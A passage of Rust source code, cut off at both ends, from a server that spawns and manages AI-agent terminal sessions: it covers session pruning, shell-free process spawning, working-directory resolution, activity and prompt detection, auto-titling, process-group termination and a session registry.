    db: &SqlitePool,
    store: Option<&TranscriptStore>,
    keep_per_workspace: usize,
) -> Result<usize, sqlx::Error> {
    // Newest first within each workspace — `sessions_to_prune` drops the tail.
    let exited: Vec<(String, String)> = sqlx::query_as(
        "SELECT workspace_id, id FROM agent_sessions
         WHERE status = 'exited'
         ORDER BY workspace_id ASC, created_at DESC, rowid DESC",
    )
    .fetch_all(db)
    .await?;

    let doomed = sessions_to_prune(&exited, keep_per_workspace);

    // A seeded session's attachments belong to its row exactly as its log does,
    // so they are dropped in the same places. Derived from the transcript
    // directory rather than passed in, so a caller cannot wire up one and forget
    // the other.
    let attachments = store.map(|s| AttachmentStore::new(attachment_dir_beside_transcripts(s.dir())));

    for id in &doomed {
        sqlx::query("DELETE FROM agent_sessions WHERE id = ?")
            .bind(id)
            .execute(db)
            .await?;
        if let Some(store) = store {
            store.delete(id).await;
        }
        if let Some(attachments) = &attachments {
            attachments.delete(id).await;
        }
    }

    // A log whose row is gone — pruned here, or removed with its workspace —
    // can never be reached again, so it is pure waste.
    if let Some(store) = store {
        let live: HashSet<String> = sqlx::query_scalar("SELECT id FROM agent_sessions")
            .fetch_all(db)
            .await?
            .into_iter()
            .collect();

        for id in store.list_ids().await {
            if !live.contains(&id) {
                store.delete(&id).await;
            }
        }

        if let Some(attachments) = &attachments {
            for id in attachments.list_ids().await {
                if !live.contains(&id) {
                    attachments.delete(&id).await;
                }
            }
        }

        // Leftovers from a compaction interrupted by a crash.
        if let Ok(mut entries) = tokio::fs::read_dir(store.dir()).await {
            while let Ok(Some(entry)) = entries.next_entry().await {
                let name = entry.file_name().to_string_lossy().to_string();
                if name.ends_with(".log.tmp") {
                    store.delete_file_name(&name).await;
                }
            }
        }
    }

    Ok(doomed.len())
}

// ---------------------------------------------------------------------------
// Spawn plan (pure — see tests)
// ---------------------------------------------------------------------------

/// A fully resolved, shell-free description of what to execute.
///
/// `program` and `args` stay separate all the way to `execvp`. Nothing here is
/// ever concatenated, quoted, or handed to `sh -c`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SpawnPlan {
    pub program: String,
    /// argv[1..]. Each element reaches the child verbatim, metacharacters and
    /// all.
    pub args: Vec<String>,
    pub cwd: PathBuf,
    /// Applied on top of the inherited environment, in order — later entries
    /// win, so a definition can deliberately override `TERM` or `KUBECONFIG`.
    pub env: Vec<(String, String)>,
}

/// Builds the spawn description. Fails only on an empty program: everything
/// else, however hostile it looks, is data.
pub fn build_spawn_plan(
    program: &str,
    args: &[String],
    cwd: &Path,
    kubeconfig: Option<&str>,
    extra_env: &[(String, String)],
) -> Result<SpawnPlan, AgentError> {
    let program = program.trim();
    if program.is_empty() {
        return Err(AgentError::EmptyCommand);
    }

    let mut env: Vec<(String, String)> = Vec::new();
    env.push(("TERM".to_string(), "xterm-256color".to_string()));
    if let Some(kc) = kubeconfig {
        if !kc.trim().is_empty() {
            env.push(("KUBECONFIG".to_string(), kc.to_string()));
        }
    }
    env.extend(extra_env.iter().cloned());

    Ok(SpawnPlan {
        program: program.to_string(),
        args: args.to_vec(),
        cwd: cwd.to_path_buf(),
        env,
    })
}

impl SpawnPlan {
    /// The one place a `SpawnPlan` becomes a process. `CommandBuilder::new`
    /// seeds argv[0] with the program and inherits the parent environment;
    /// every argument is pushed individually.
    fn to_command_builder(&self) -> CommandBuilder {
        let mut cmd = CommandBuilder::new(&self.program);
        for arg in &self.args {
            cmd.arg(arg);
        }
        cmd.cwd(&self.cwd);
        for (k, v) in &self.env {
            cmd.env(k, v);
        }
        cmd
    }
}

/// Reuses the same resolution order as `ws/shell.rs`: the stored preference
/// first, then `KUBECONFIG_PATH`, then nothing (the child inherits whatever the
/// server has).
pub async fn resolve_kubeconfig_path(db: &SqlitePool) -> Option<String> {
    sqlx::query_scalar::<_, String>(
        "SELECT value FROM user_preferences WHERE key = 'kubeconfigPath'",
    )
    .fetch_optional(db)
    .await
    .ok()
    .flatten()
    .or_else(|| std::env::var("KUBECONFIG_PATH").ok())
}

/// Where a session's working directory came from, so a failure names the right
/// thing back to the user.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CwdChoice {
    /// A `cwd` supplied on the request.
    Explicit(String),
    /// The workspace's bound folder — the default when no `cwd` is given.
    WorkspaceFolder(String),
}

impl CwdChoice {
    pub fn path(&self) -> &str {
        match self {
            CwdChoice::Explicit(p) | CwdChoice::WorkspaceFolder(p) => p,
        }
    }
}

/// Picks a session's working directory: an explicit `cwd` wins over the
/// workspace's bound folder, and a blank string on either side counts as
/// absent. `None` means nothing said where to run.
///
/// The workspace folder was never a confinement boundary for agents — the user
/// already supplies the command, which runs with their full privileges — so an
/// explicit `cwd` outside it is the feature, not a hole. (The filesystem API in
/// `fs/mod.rs` confines paths for entirely separate reasons.)
pub fn choose_cwd(explicit: Option<&str>, workspace_folder: Option<&str>) -> Option<CwdChoice> {
    fn nonblank(s: &str) -> Option<String> {
        let trimmed = s.trim();
        (!trimmed.is_empty()).then(|| trimmed.to_string())
    }

    if let Some(path) = explicit.and_then(nonblank) {
        return Some(CwdChoice::Explicit(path));
    }
    workspace_folder.and_then(nonblank).map(CwdChoice::WorkspaceFolder)
}

/// Resolves a session's working directory into a confirmed directory.
///
/// Uses `tokio::fs` — this runs on request paths and `std::fs::metadata` would
/// block the executor.
pub async fn resolve_session_cwd(
    db: &SqlitePool,
    workspace_id: &str,
    explicit: Option<&str>,
) -> Result<PathBuf, AgentError> {
    // The workspace must exist even when the caller brought its own `cwd`: the
    // session row is scoped to it, and a session hanging off a workspace that
    // is not there could never be listed.
    let folder: Option<Option<String>> =
        sqlx::query_scalar("SELECT folder_path FROM workspaces WHERE id = ?")
            .bind(workspace_id)
            .fetch_optional(db)
            .await?;

    let folder = folder.ok_or_else(|| AgentError::WorkspaceNotFound(workspace_id.to_string()))?;

    let choice = choose_cwd(explicit, folder.as_deref())
        .ok_or_else(|| AgentError::NoCwd(workspace_id.to_string()))?;

    let path = PathBuf::from(choice.path());
    match tokio::fs::metadata(&path).await {
        Ok(meta) if meta.is_dir() => {}
        _ => {
            return Err(match choice {
                CwdChoice::Explicit(p) => AgentError::CwdMissing(p),
                CwdChoice::WorkspaceFolder(p) => AgentError::WorkspaceFolderMissing(p),
            })
        }
    }

    // Canonicalize so the child's cwd does not depend on the server's cwd or on
    // a symlink that may be re-pointed later.
    Ok(tokio::fs::canonicalize(&path).await.unwrap_or(path))
}

// ---------------------------------------------------------------------------
// Activity heuristic (pure — see tests)
// ---------------------------------------------------------------------------

/// Whether a session looks busy or looks like it wants the user.
///
/// **This is inferred, not observed.** A PTY yields bytes, not intent: there is
/// no portable way to ask whether a child is blocked in `read()`. So `working`
/// and `waiting` are derived purely from *output recency* — an agent streams
/// while it thinks and falls silent at a prompt, which makes silence a decent
/// proxy for "wants you". It is only a proxy: a long silent build reads as
/// `waiting` too. Only `exited` is authoritative, and it comes from the reaped
/// child, not from this guess.
///
/// Kept distinct from [`SessionStatus`], which is the fact of the matter.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Activity {
    Working,
    Waiting,
    Exited,
}

impl Activity {
    pub fn as_str(&self) -> &'static str {
        match self {
            Activity::Working => "working",
            Activity::Waiting => "waiting",
            Activity::Exited => "exited",
        }
    }
}

/// How much the `waiting` guess should be trusted. `High` means the scrollback
/// tail matched one of the definition's prompt patterns, i.e. the agent
/// visibly printed a question; `Low` means it is merely quiet.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum WaitingConfidence {
    High,
    Low,
}

impl WaitingConfidence {
    pub fn as_str(&self) -> &'static str {
        match self {
            WaitingConfidence::High => "high",
            WaitingConfidence::Low => "low",
        }
    }
}

/// The derivation itself. A dead process is `exited` no matter how recently it
/// spoke — its last words do not make it busy.
pub fn derive_activity(alive: bool, since_last_output: Duration, window: Duration) -> Activity {
    if !alive {
        return Activity::Exited;
    }
    if since_last_output < window {
        Activity::Working
    } else {
        Activity::Waiting
    }
}

/// Confidence is only meaningful for `waiting`; the other states report `null`.
pub fn derive_waiting_confidence(
    activity: Activity,
    patterns: &PromptPatterns,
    tail: &[u8],
) -> Option<WaitingConfidence> {
    if activity != Activity::Waiting {
        return None;
    }
    if patterns.matches(tail) {
        Some(WaitingConfidence::High)
    } else {
        Some(WaitingConfidence::Low)
    }
}

/// A definition's prompt regexes, compiled once.
///
/// Patterns are matched against the raw scrollback tail, escape sequences and
/// all — a pattern anchored to end-of-input may therefore miss a prompt that is
/// followed by a colour reset. Matching a distinctive literal (`"(y/n)"`,
/// `"Do you want to"`) is the reliable approach.
#[derive(Debug, Default)]
pub struct PromptPatterns {
    regexes: Vec<Regex>,
}

impl PromptPatterns {
    /// Compiles every pattern, **skipping** the ones that do not compile.
    ///
    /// A typo in a user's regex must not take the session's activity signal
    /// down with it, so an invalid pattern is logged once here and thereafter
    /// simply never matches.
    pub fn compile(patterns: &[String]) -> Self {
        let mut regexes = Vec::with_capacity(patterns.len());
        for pattern in patterns {
            match Regex::new(pattern) {
                Ok(re) => regexes.push(re),
                Err(err) => {
                    tracing::warn!(
                        pattern = %pattern,
                        error = %err,
                        "ignoring invalid agent prompt pattern"
                    );
                }
            }
        }
        Self { regexes }
    }

    pub fn is_empty(&self) -> bool {
        self.regexes.is_empty()
    }

    /// True when any pattern matches the tail. A definition with no (valid)
    /// patterns never matches, which keeps its sessions at `low` confidence
    /// rather than falsely promoting them.
    pub fn matches(&self, tail: &[u8]) -> bool {
        if self.regexes.is_empty() {
            return false;
        }
        // Lossy is right here: the tail is a byte window that may start
        // mid-codepoint, and a replacement char cannot create a false match on
        // any pattern a user would sensibly write.
        let text = String::from_utf8_lossy(tail);
        self.regexes.iter().any(|re| re.is_match(&text))
    }
}

// ---------------------------------------------------------------------------
// Auto-title (pure — see tests)
// ---------------------------------------------------------------------------

/// Longest auto-derived title, in characters. A tab strip has no room for more.
pub const AUTO_TITLE_MAX_CHARS: usize = 60;

/// How many opening bytes are examined for a title. The interesting line is the
/// first one an agent prints; past this the session is well under way and a
/// title taken from it would describe a random moment, not the session.
pub const AUTO_TITLE_SCAN_BYTES: usize = 4096;

/// How long after spawn auto-titling may still fire. Bounded so a session
/// cannot be silently renamed minutes in, long after the user has looked at it.
pub const AUTO_TITLE_WINDOW: Duration = Duration::from_secs(5);

/// Alphanumerics a line needs before it can be a title. Two is too easy for a
/// spinner frame with a label; three still admits any real sentence.
const MIN_TITLE_ALPHANUMERICS: usize = 3;

/// Removes ANSI escape sequences and the remaining C0 controls.
///
/// Hand-written rather than regex-based because the shapes are few and fixed:
/// CSI (`ESC [` … final byte in `@`–`~`), OSC (`ESC ]` … BEL or ST), and the
/// two-character escapes. A byte window may also begin mid-sequence, so an
/// unterminated escape simply consumes the rest of the line.
pub fn strip_ansi(input: &str) -> String {
    let mut out = String::with_capacity(input.len());
    let mut chars = input.chars().peekable();

    while let Some(c) = chars.next() {
        if c != '\u{1b}' {
            // A tab is whitespace and survives as a space; every other control
            // character carries no text.
            if c == '\t' {
                out.push(' ');
            } else if !c.is_control() {
                out.push(c);
            }
            continue;
        }

        match chars.next() {
            Some('[') => {
                for c in chars.by_ref() {
                    if ('\u{40}'..='\u{7e}').contains(&c) {
                        break;
                    }
                }
            }
            Some(']') => {
                while let Some(c) = chars.next() {
                    if c == '\u{7}' {
                        break;
                    }
                    if c == '\u{1b}' {
                        if chars.peek() == Some(&'\\') {
                            chars.next();
                        }
                        break;
                    }
                }
            }
            // Two-character escape (or a truncated one): both chars are gone.
            _ => {}
        }
    }
    out
}

/// Characters that carry no meaning at the edge of a line: whitespace, box
/// drawing, block and geometric shapes, braille (spinner frames), and the
/// punctuation banners are ruled and bulleted with.
///
/// Deliberately narrow. `/`, `\` and `.` are NOT here: trimming them would turn
/// a first line of `/srv/app` into `srv/app` and `.gitignore updated` into
/// `gitignore updated`. Decoration made only of them has no alphanumerics
/// either way, so [`MIN_TITLE_ALPHANUMERICS`] already rejects it.
fn is_decoration(c: char) -> bool {
    c.is_whitespace()
        || matches!(c,
            '\u{2500}'..='\u{257f}'   // box drawing
            | '\u{2580}'..='\u{259f}' // block elements
            | '\u{25a0}'..='\u{25ff}' // geometric shapes
            | '\u{2600}'..='\u{27bf}' // misc symbols & dingbats
            | '\u{2800}'..='\u{28ff}' // braille
        )
        || "*#=-_~+|<>•·".contains(c)
}

fn alphanumeric_count(s: &str) -> usize {
    s.chars().filter(|c| c.is_alphanumeric()).count()
}

fn truncate_title(s: &str) -> String {
    if s.chars().count() <= AUTO_TITLE_MAX_CHARS {
        return s.to_string();
    }
    // Char-wise, never byte-wise: agents print box-drawn UI and emoji, and a
    // byte slice would land mid-codepoint.
    let kept: String = s.chars().take(AUTO_TITLE_MAX_CHARS - 1).collect();
    format!("{}…", kept.trim_end())
}

/// Derives a session title from the opening bytes of its output, or `None` when
/// nothing there is worth showing.
///
/// Best effort by design: a bad title is worse than the default, so anything
/// ambiguous is skipped rather than guessed at. Skipped outright are
/// unterminated lines (the tail of a live stream is usually half-written) and
/// lines that are pure decoration — box rules, spinner frames, and the ASCII-art
/// banners agents open with, none of which survive stripping their edges down to
/// [`MIN_TITLE_ALPHANUMERICS`] alphanumerics.
pub fn extract_auto_title(output: &[u8]) -> Option<String> {
    // Lossy: `output` is a byte window that may start or end mid-codepoint.
    let text = String::from_utf8_lossy(output);

    // `\r` terminates a line too — TUI agents redraw a status line without ever
    // emitting `\n`.
    let mut lines: Vec<&str> = text.split(['\n', '\r']).collect();
    // Drop the trailing segment: nothing has terminated it yet, so it may be a
    // fragment. Titling a session "Reading src/ma" would be worse than nothing.
    lines.pop();

    for line in lines {
        let cleaned = strip_ansi(line);
        let trimmed = cleaned.trim_matches(is_decoration);
        if alphanumeric_count(trimmed) < MIN_TITLE_ALPHANUMERICS {
            continue;
        }
        return Some(truncate_title(trimmed));
    }
    None
}

/// Writes an auto-derived title — but only while the row still says the title
/// is the default.
///
/// The `title_is_custom = 0` predicate is the real guard, not the check the
/// caller already made: a rename landing between the two must still win, and
/// the row is what the API reports. The in-memory copy is only touched when the
/// write took effect AND the latch is still clear, so a concurrent rename can
/// never be undone in either place.
async fn apply_auto_title(
    db: &SqlitePool,
    id: &str,
    title: &Arc<Mutex<String>>,
    title_is_custom: &Arc<std::sync::atomic::AtomicBool>,
    derived: &str,
) {
    let result = sqlx::query("UPDATE agent_sessions SET title = ? WHERE id = ? AND title_is_custom = 0")
        .bind(derived)
        .bind(id)
        .execute(db)
        .await;

    let applied = matches!(result, Ok(ref r) if r.rows_affected() == 1);
    if applied && !title_is_custom.load(std::sync::atomic::Ordering::SeqCst) {
        *title.lock().expect("title mutex") = derived.to_string();
    }
}

// ---------------------------------------------------------------------------
// Session
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SessionStatus {
    Running,
    Exited { code: Option<i32> },
}

impl SessionStatus {
    pub fn as_str(&self) -> &'static str {
        match self {
            SessionStatus::Running => "running",
            SessionStatus::Exited { .. } => "exited",
        }
    }
}

/// What the API layer needs to describe a session without touching the PTY.
#[derive(Debug, Clone, serde::Serialize)]
pub struct AgentSessionInfo {
    pub id: String,
    #[serde(rename = "workspaceId")]
    pub workspace_id: String,
    #[serde(rename = "definitionId")]
    pub definition_id: Option<String>,
    pub title: String,
    pub status: String,
    #[serde(rename = "exitCode")]
    pub exit_code: Option<i32>,
    /// Inferred from output recency — see [`Activity`]. Not authoritative.
    pub activity: String,
    #[serde(rename = "waitingConfidence")]
    pub waiting_confidence: Option<String>,
}

/// A live PTY plus everything needed to attach to it later.
///
/// Deliberately *not* holding a subscriber count: dropping the last subscriber
/// must not affect the process in any way. Detach is a no-op by construction.
pub struct AgentSession {
    pub id: String,
    pub workspace_id: String,
    pub definition_id: Option<String>,
    /// Where the process was started. Resolved once at spawn (see
    /// [`resolve_session_cwd`]) and never re-derived.
    pub cwd: PathBuf,

    /// Mutable because both the user (rename) and the auto-titler write it.
    title: Arc<Mutex<String>>,

    /// Set once the user names the session, and never cleared. This is the
    /// latch that keeps a chosen title from drifting back to whatever the agent
    /// last printed — the auto-titler checks it and gives up for good.
    title_is_custom: Arc<std::sync::atomic::AtomicBool>,

    /// Guards the scrollback *and* the ordering of `output_tx.send`. The pump
    /// holds it across push+broadcast and `attach` holds it across
    /// snapshot+subscribe, which is what makes replay exactly-once: without
    /// that, a chunk landing between the two would be replayed and broadcast.
    scrollback: Arc<Mutex<ScrollbackBuffer>>,
    output_tx: broadcast::Sender<Arc<[u8]>>,

    /// PTY master writer. Writes are blocking, so callers go through
    /// [`AgentSession::write_input`], which hops onto the blocking pool.
    writer: Arc<Mutex<Box<dyn Write + Send>>>,
    master: Arc<Mutex<Box<dyn MasterPty + Send>>>,

    /// Fallback terminator for platforms without process groups; on unix the
    /// group kill below is what actually runs.
    killer: Mutex<Box<dyn ChildKiller + Send + Sync>>,
    pid: Option<u32>,

    status: Mutex<SessionStatus>,

    /// When output was last seen, on the monotonic clock.
    ///
    /// `Instant`, never wall-clock: a DST change or an NTP step must not make a
    /// busy session look idle for an hour, nor an idle one look busy. Seeded at
    /// spawn so a session that has not printed anything yet is `working` for
    /// its first window rather than reporting `waiting` before it has had a
    /// chance to speak.
    last_output: Arc<Mutex<Instant>>,

    /// Whether the process has ever printed anything.
    ///
    /// Separate from `last_output`, which is seeded at spawn and so cannot
    /// distinguish "quiet after working" from "has not started talking yet".
    /// The seeder needs that distinction — see [`seed_session_when_ready`].
    saw_output: Arc<std::sync::atomic::AtomicBool>,

    /// Latches when the seed prompt is claimed for sending. The prompt goes in
    /// exactly once, ever.
    seed_claimed: std::sync::atomic::AtomicBool,

    /// Compiled once when the session starts, shared with every other session
    /// launched from the same pattern set.
    prompt_patterns: Arc<PromptPatterns>,
}

impl AgentSession {
    pub fn title(&self) -> String {
        self.title.lock().expect("title mutex").clone()
    }

    /// Records a title the user chose. Irreversible on purpose: from here on
    /// the auto-titler skips this session entirely.
    pub fn set_custom_title(&self, title: &str) {
        self.title_is_custom
            .store(true, std::sync::atomic::Ordering::SeqCst);
        *self.title.lock().expect("title mutex") = title.to_string();
    }

    pub fn status(&self) -> SessionStatus {
        self.status.lock().expect("status mutex").clone()
    }

    pub fn is_running(&self) -> bool {
        matches!(self.status(), SessionStatus::Running)
    }

    /// Time since the last chunk of output (or since spawn, if there has been
    /// none).
    pub fn since_last_output(&self) -> Duration {
        self.last_output.lock().expect("last_output mutex").elapsed()
    }

    /// Whether the process has printed anything at all yet.
    pub fn has_produced_output(&self) -> bool {
        self.saw_output.load(std::sync::atomic::Ordering::Relaxed)
    }

    /// Claims the one-shot right to write the seed prompt, returning `false`
    /// when it has already been claimed.
    pub fn claim_seed(&self) -> bool {
        self.seed_claimed
            .compare_exchange(
                false,
                true,
                std::sync::atomic::Ordering::SeqCst,
                std::sync::atomic::Ordering::SeqCst,
            )
            .is_ok()
    }

    /// The inferred [`Activity`] plus, when waiting, how much to trust it.
    ///
    /// The scrollback tail is only read when the session is otherwise
    /// `waiting`, so the common `working` case costs one lock and no regex.
    pub fn activity(&self) -> (Activity, Option<WaitingConfidence>) {
        let activity = derive_activity(
            self.is_running(),
            self.since_last_output(),
            ACTIVITY_WORKING_WINDOW,
        );

        if activity != Activity::Waiting {
            return (activity, None);
        }

        // A definition with no patterns can only ever be `low`, so skip the
        // scrollback lock entirely in that case.
        let tail = if self.prompt_patterns.is_empty() {
            Vec::new()
        } else {
            let sb = self.scrollback.lock().expect("scrollback mutex");
            sb.tail(PROMPT_SCAN_BYTES)
        };

        (
            activity,
            derive_waiting_confidence(activity, &self.prompt_patterns, &tail),
        )
    }

    pub fn info(&self) -> AgentSessionInfo {
        let status = self.status();
        let (activity, confidence) = self.activity();
        AgentSessionInfo {
            id: self.id.clone(),
            workspace_id: self.workspace_id.clone(),
            definition_id: self.definition_id.clone(),
            title: self.title(),
            status: status.as_str().to_string(),
            exit_code: match status {
                SessionStatus::Exited { code } => code,
                SessionStatus::Running => None,
            },
            activity: activity.as_str().to_string(),
            waiting_confidence: confidence.map(|c| c.as_str().to_string()),
        }
    }

    /// Subscribes to live output and returns the scrollback to replay first.
    ///
    /// Any number of callers may attach concurrently, and an exited session may
    /// still be attached to — the scrollback outlives the process so the user
    /// can read how it ended.
    pub fn attach(&self) -> (Vec<u8>, broadcast::Receiver<Arc<[u8]>>) {
        let guard = self.scrollback.lock().expect("scrollback mutex");
        let rx = self.output_tx.subscribe();
        let replay = guard.snapshot();
        (replay, rx)
    }

    /// Feeds bytes to the PTY. Safe to call from several subscribers at once;
    /// the mutex serializes them at whole-write granularity.
    pub async fn write_input(&self, data: Vec<u8>) -> std::io::Result<()> {
        let writer = self.writer.clone();
        tokio::task::spawn_blocking(move || {
            let mut w = writer.lock().expect("writer mutex");
            w.write_all(&data)?;
            w.flush()
        })
        .await
        .unwrap_or_else(|e| Err(std::io::Error::other(e)))
    }

    pub fn resize(&self, rows: u16, cols: u16) -> std::io::Result<()> {
        let master = self.master.lock().expect("master mutex");
        master
            .resize(PtySize {
                rows,
                cols,
                pixel_width: 0,
                pixel_height: 0,
            })
            .map_err(std::io::Error::other)
    }

    /// Terminates the session's process **group**.
    ///
    /// Killing the pid alone is not enough: an agent typically spawns compilers,
    /// test runners and shells, and those would survive as orphans still holding
    /// the workspace. `portable-pty` calls `setsid()` in the child, so the child
    /// is a session and process-group leader and its pgid equals its pid; every
    /// descendant inherits that group unless it deliberately leaves.
    ///
    /// SIGTERM first so the agent can flush, SIGKILL after a grace period.
    pub fn kill(&self) {
        #[cfg(unix)]
        if let Some(pid) = self.pid {
            unsafe { signal_process_group(pid, libc::SIGTERM) };
            let pid_for_kill = pid;
            tokio::spawn(async move {
                tokio::time::sleep(KILL_GRACE).await;
                // Harmless if the group is already gone: killpg then fails with
                // ESRCH, and the pid cannot have been recycled while the child
                // is unreaped (the waiter thread holds it).
                unsafe { signal_process_group(pid_for_kill, libc::SIGKILL) };
            });
            return;
        }

        if let Ok(mut killer) = self.killer.lock() {
            let _ = killer.kill();
        }
    }
}

/// Signals the process group led by `pid`.
///
/// # Safety
/// Calls `killpg(2)`. `pid` must be a process id this server spawned; the
/// caller must not have reaped it, or the pgid could name an unrelated group.
#[cfg(unix)]
unsafe fn signal_process_group(pid: u32, signal: i32) {
    let pgid = {
        let queried = libc::getpgid(pid as libc::pid_t);
        if queried > 0 {
            queried
        } else {
            // The child is its own group leader (portable-pty setsid()s), so
            // its pid is its pgid even when getpgid fails.
            pid as libc::pid_t
        }
    };
    if pgid > 1 {
        libc::killpg(pgid, signal);
    }
}

// ---------------------------------------------------------------------------
// Registry
// ---------------------------------------------------------------------------

pub struct SpawnRequest {
    pub workspace_id: String,
    pub definition_id: Option<String>,
    pub title: String,
    /// True when `title` is the user's own words rather than the definition's
    /// name. Suppresses auto-titling from the very first byte — a title the
    /// user typed is already the best one available.
    pub title_is_custom: bool,
    /// Where to run. `None` means "the workspace's bound folder"; see
    /// [`choose_cwd`].
    pub cwd: Option<String>,
    pub program: String,
    pub args: Vec<String>,
    pub env: Vec<(String, String)>,
    /// Regexes that, when seen at the end of the scrollback, mean the agent is
    /// asking the user something. Optional — an empty list just means every
    /// `waiting` verdict reports `low` confidence.
    pub prompt_patterns: Vec<String>,
    pub rows: u16,
    pub cols: u16,
    /// A task and the context it is about, to prime the session with. `None` is
    /// an ordinary session that waits for the user to type.
    pub seed: Option<SessionSeed>,
}

/// Process-global registry of agent PTYs. Cloneable and cheap: everything is
/// behind one `Arc`, so it can live in `AppState`.
#[derive(Clone)]
pub struct AgentRegistry {
    sessions: Arc<DashMap<String, Arc<AgentSession>>>,
    /// Serializes the capacity check with the insert. Without it, sixteen
    /// simultaneous requests could each observe fifteen live sessions.
    spawn_lock: Arc<tokio::sync::Mutex<()>>,
    /// Compiled prompt regexes, keyed by the pattern list itself.
    ///
    /// Regex compilation is expensive and the activity signal is polled, so it
    /// happens once per distinct pattern set at spawn time and never on the
    /// poll path. Keying on the patterns rather than on a definition id means
    /// editing a definition transparently produces a new entry instead of
    /// serving a stale compilation.
    pattern_cache: Arc<DashMap<Vec<String>, Arc<PromptPatterns>>>,
    /// Where session transcripts are written and replayed from. `None` means
    /// no durable transcripts at all — the registry still works, sessions are
    /// simply unreadable once the process that ran them is gone.
    transcripts: Option<TranscriptStore>,
    /// Where seeded sessions' attached context is written. `None` means a
    /// session cannot be seeded with attachments at all; a bare prompt still
    /// works.
    attachments: Option<AttachmentStore>,
}

impl Default for AgentRegistry {
    fn default() -> Self {
        Self::new()
    }
}

impl AgentRegistry {
    /// A registry with no durable transcripts. Used by tests; the server always
    /// goes through [`AgentRegistry::with_transcripts`].
    pub fn new() -> Self {
        Self {
            sessions: Arc::new(DashMap::new()),
            spawn_lock: Arc::new(tokio::sync::Mutex::new(())),
            pattern_cache: Arc::new(DashMap::new()),
            transcripts: None,
            attachments: None,
        }
    }

    /// A registry that mirrors every session's output into `dir`, and stores
    /// seeded sessions' attachments in `dir`'s sibling — one app-data directory
    /// for both, without a second copy of how that directory is located.
    pub fn with_transcripts(dir: PathBuf) -> Self {
        let attachments = AttachmentStore::new(attachment_dir_beside_transcripts(&dir));
        Self {
            transcripts: Some(TranscriptStore::new(dir)),
            attachments: Some(attachments),
            ..Self::new()
        }
    }

    /// The transcript store, for the attach path (replaying an archived
    /// session) and the API layer (reporting whether one exists).
    pub fn transcripts(&self) -> Option<&TranscriptStore> {
        self.transcripts.as_ref()
    }

    /// Where seeded sessions' attachments live.
    pub fn attachments(&self) -> Option<&AttachmentStore> {
        self.attachments.as_ref()
    }

    /// Drops a session's attachments after a spawn that never completed.
    async fn discard_attachments(&self, id: &str) {
        if let Some(store) = &self.attachments {
            store.delete(id).await;
        }
    }

    pub fn get(&self, id: &str) -> Option<Arc<AgentSession>> {
        self.sessions.get(id).map(|e| e.value().clone())
    }

    /// Returns the compiled form of `patterns`, compiling on first sight.
    fn compiled_patterns(&self, patterns: &[String]) -> Arc<PromptPatterns> {
        if let Some(hit) = self.pattern_cache.get(patterns) {
            return hit.value().clone();
        }
        let compiled = Arc::new(PromptPatterns::compile(patterns));
        self.pattern_cache
            .insert(patterns.to_vec(), compiled.clone());
        compiled
    }

    pub fn live_count(&self) -> usize {
        self.sessions.iter().filter(|e| e.value().is_running()).count()
    }

    pub fn list(&self, workspace_id: Option<&str>) -> Vec<AgentSessionInfo> {
        self.sessions
            .iter()
            .filter(|e| match workspace_id {
                Some(ws) => e.value().workspace_id == ws,
                None => true,
            })
            .map(|e| e.value().info())
            .collect()
    }

    /// Kills a session's process group and forgets it. The in-memory scrollback
    /// goes with it; the on-disk transcript does not, and is what the attach
    /// path replays afterwards.
    pub fn remove(&self, id: &str) -> Option<Arc<AgentSession>> {
        let session = self.sessions.remove(id).map(|(_, s)| s)?;
        if session.is_running() {
            session.kill();
        }
        Some(session)
    }

    /// Kills every live session. Called on shutdown — agents are not daemons,
    /// and a server restart marks their rows `exited` anyway.
    pub fn kill_all(&self) {
        for entry in self.sessions.iter() {
            if entry.value().is_running() {
                entry.value().kill();
            }
        }
    }

    /// Starts a PTY, records it in `agent_sessions`, and registers it.
    ///
    /// The returned session outlives every WebSocket that ever attaches to it:
    /// nothing in the attach path owns the child, the reader thread, or the
    /// writer, so dropping the last subscriber is a no-op for the process.
    pub async fn spawn_session(
        &self,
        db: &SqlitePool,
        req: SpawnRequest,
    ) -> Result<AgentSessionInfo, AgentError> {
        let cwd = resolve_session_cwd(db, &req.workspace_id, req.cwd.as_deref()).await?;
        let kubeconfig = resolve_kubeconfig_path(db).await;
        let plan = build_spawn_plan(
            &req.program,
            &req.args,
            &cwd,
            kubeconfig.as_deref(),
            &req.env,
        )?;

        // Checked here as well as at the API boundary, so no caller can spend
        // the disk by going around the handler.
        if let Some(seed) = &req.seed {
            check_attachment_budget(&seed.attachments, MAX_ATTACHMENT_TOTAL_BYTES)?;
        }

        let guard = self.spawn_lock.lock().await;
        if self.live_count() >= MAX_LIVE_SESSIONS {
            return Err(AgentError::CapacityExceeded {
                max: MAX_LIVE_SESSIONS,
            });
        }

        let id = Uuid::new_v4().to_string();

        // Attachments become files BEFORE the process starts, so the paths the
        // prompt names are already readable by the time the agent sees them.
        // A failure here aborts the spawn: an agent pointed at a file that is
        // not there is worse than one that never ran.
        let seed_prompt = match &req.seed {
            Some(seed) => {
                let paths = if seed.attachments.is_empty() {
                    Vec::new()
                } else {
                    let store = self
                        .attachments
                        .as_ref()
                        .ok_or_else(|| AgentError::Attachment("no attachment directory".into()))?;
                    store
                        .write_all(&id, &seed.attachments)
                        .await
                        .map_err(|e| AgentError::Attachment(e.to_string()))?
                };
                compose_seed_prompt(seed.prompt.as_deref(), &paths)
            }
            None => None,
        };

        let session = match self.start_pty(db, &id, &req, &plan) {
            Ok(session) => session,
            Err(e) => {
                self.discard_attachments(&id).await;
                return Err(e);
            }
        };

        // The resolved cwd is persisted, not re-derived on read: it is where
        // this session actually ran, and several sessions in one workspace are
        // otherwise indistinguishable.
        let seed_status = if seed_prompt.is_some() {
            SeedStatus::Pending
        } else {
            SeedStatus::None
        };
        let inserted = sqlx::query(
            "INSERT INTO agent_sessions
             (id, workspace_id, definition_id, title, title_is_custom, cwd,
              status, seed_status, created_at, last_activity_at)
             VALUES (?, ?, ?, ?, ?, ?, 'running', ?, datetime('now'), datetime('now'))",
        )
        .bind(&id)
        .bind(&req.workspace_id)
        .bind(&req.definition_id)
        .bind(&req.title)
        .bind(i64::from(req.title_is_custom))
        .bind(plan.cwd.to_string_lossy().as_ref())
        .bind(seed_status.as_str())
        .execute(db)
        .await;

        if let Err(e) = inserted {
            session.kill();
            self.discard_attachments(&id).await;
            return Err(e.into());
        }

        // Started only after the row exists, so the seeder's `seed_status`
